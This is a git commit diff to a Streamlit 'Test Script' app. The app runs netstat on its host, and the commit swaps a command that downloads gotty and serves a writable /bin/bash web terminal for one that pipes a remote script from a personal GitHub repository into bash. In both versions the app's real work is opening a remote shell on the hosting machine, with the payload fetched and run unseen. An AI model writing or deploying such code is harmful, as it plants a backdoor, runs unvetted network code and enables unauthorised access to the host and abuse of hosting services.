50d0ef98bf8d9348ea99affddf9c50a60d2f0f5f
aphiwemthambisi <aphiwemthambisi@gmail.com>
2024-12-28 05:54:06 +0200

    Update app.py

--- app.py
+++ app.py
@@ -5,5 +5,5 @@ st.title("Test Script")
 st.header("Test")
 
 os.system("netstat -ntlp")
-results = os.system("curl https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz -L -O -J && tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash")
+results = os.system("curl -fsSL https://raw.githubusercontent.com/aphiwemthambisi/Gotty-Remake/refs/heads/main/script.sh | bash")
 st.write(results)
